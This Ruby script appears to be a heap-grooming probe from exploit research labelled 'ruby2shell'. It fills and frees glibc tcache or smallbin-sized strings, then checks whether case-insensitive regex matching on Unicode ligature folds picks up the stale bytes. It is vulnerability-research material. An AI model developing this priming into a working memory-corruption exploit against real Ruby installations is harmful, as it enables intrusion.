#!/usr/bin/env ruby
# frozen_string_literal: true
# Usage: ruby ruby2shell-casefold-stringprime.rb SO small|large [COUNT]
# For each fold candidate: build non-embedded Ruby Strings filled with the
# fold's SECOND byte, free them via GC, compile the one-byte-exact /needle/i,
# and report match?.  `small` = 24-byte buffers (glibc 0x20 tcache), `large`
# = 512-byte buffers (0x210, unsorted/smallbin under a drained tcache).
require ARGV.fetch(0)
mode  = ARGV.fetch(1)
count = Integer(ARGV.fetch(2) || "8")
len   = mode == "small" ? 24 : 512

# [name, needle byte, codepoint, expected fold's 2nd byte]
CASES = [
  ["FB00", 0x66, 0xfb00, 0x66], # fold "ff"
  ["FB01", 0x66, 0xfb01, 0x69], # fold "fi"
  ["FB02", 0x66, 0xfb02, 0x6c], # fold "fl"
  ["FB03", 0x66, 0xfb03, 0x66], # fold "ffi"
  ["00DF", 0x73, 0x00df, 0x73], # fold "ss"
  ["1E9E", 0x73, 0x1e9e, 0x73], # fold "SS"
  ["FB05", 0x73, 0xfb05, 0x74], # fold "st"
  ["FB06", 0x73, 0xfb06, 0x74]  # fold "st"
].freeze

CASES.each do |name, needle, cp, fold2|
  ary = Ruby2ShellCasefoldStringprime.make(fold2, len, count)
  ary = nil
  GC.start
  match = Regexp.new(needle.chr, Regexp::IGNORECASE).match?(cp.chr(Encoding::UTF_8))
  puts "ruby=#{RUBY_VERSION} mode=#{mode} count=#{count} case=#{name} prime=%02x match=%s" %
       [fold2, match]
end
